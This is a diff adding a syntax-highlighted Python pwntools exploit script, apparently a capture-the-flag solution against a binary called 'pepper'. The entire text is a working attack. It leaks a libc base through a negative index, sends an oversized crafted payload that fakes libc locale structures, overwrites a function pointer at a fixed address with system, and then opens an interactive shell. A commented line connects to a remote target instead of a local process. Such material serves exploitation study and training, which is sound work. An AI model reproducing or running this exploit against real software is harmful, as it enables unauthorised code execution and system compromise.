@@ -1,0 +1,104 @@
+<div class="highlight"><pre><span class="c">#! /usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&#39;/usr/lib/libc.so.6&#39;</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pepper&#39;</span><span class="p">)</span>
+<span class="c">#p = remote(&#39;192.168.56.101&#39;, 8888)</span>
+
+<span class="c">#leak</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;-3&#39;</span><span class="p">)</span>
+<span class="n">rdata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;No.&#39;</span><span class="p">)</span>
+<span class="n">rdata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">rdata</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span> <span class="s">&#39;libc_base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span> <span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span> <span class="s">&#39;system: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="p">)</span>
+
+<span class="c">#add 0</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;131063&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+
+<span class="c">#add 1</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;18&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+
+<span class="c">#edit 0</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;148793&#39;</span><span class="p">)</span>
+<span class="n">pre</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b0a0</span> <span class="o">+</span> <span class="mi">52</span><span class="p">)</span>
+<span class="n">head</span> <span class="o">=</span> <span class="n">pre</span> <span class="o">+</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">131064</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pre</span><span class="p">))</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="n">head</span> <span class="o">+</span> <span class="s">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="o">*</span><span class="mh">0x6b4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;_nl_global_locale&#39;</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;_res@GLIBC_2.0&#39;</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;_nl_C_LC_CTYPE_tolower&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">512</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;_nl_C_LC_CTYPE_toupper&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">512</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;_nl_C_LC_CTYPE_class&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;edit 0&#39;</span><span class="p">)</span>
+
+<span class="c">#add 2</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;add 2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+
+
+<span class="c">#edit 2</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;edit 2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;32&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x804b02c</span><span class="p">))</span>
+
+
+
+
+<span class="c">#write system</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;edit 1&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;32&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="c">#shell</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;31337&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;sh&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
